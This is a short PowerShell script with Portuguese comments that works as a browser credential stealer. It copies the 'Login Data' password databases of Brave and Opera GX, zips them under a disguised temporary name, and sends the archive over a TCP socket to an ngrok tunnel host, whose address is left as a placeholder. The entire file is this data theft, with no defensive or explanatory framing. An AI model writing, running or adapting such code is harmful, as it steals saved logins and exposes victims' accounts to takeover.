$roaming = $env:APPDATA
$local   = $env:LOCALAPPDATA
$temp    = $env:TEMP
$zip     = "$temp\envio.zip"

# Arquivo temporário com nome alterado
$tempFile = "$temp\UwUoperad"

# Remove ZIP antigo
if (Test-Path $zip) { Remove-Item $zip -Force }

# Cria cópia temporária com novo nome
Copy-Item "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" $tempFile -Force

# Cria ZIP
Compress-Archive `
    "$roaming\Opera Software\Opera GX Stable\Default\Login Data", `
    $tempFile `
    -DestinationPath $zip -Force

# Remove o arquivo temporário
Remove-Item $tempFile -Force

# Envia via TCP
$c = New-Object Net.Sockets.TCPClient(" (domin) .tcp.eu.ngrok.io", (porta) )
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes($zip)
$s.Write($b,0,$b.Length)
$s.Flush()
$s.Close()
$c.Close()
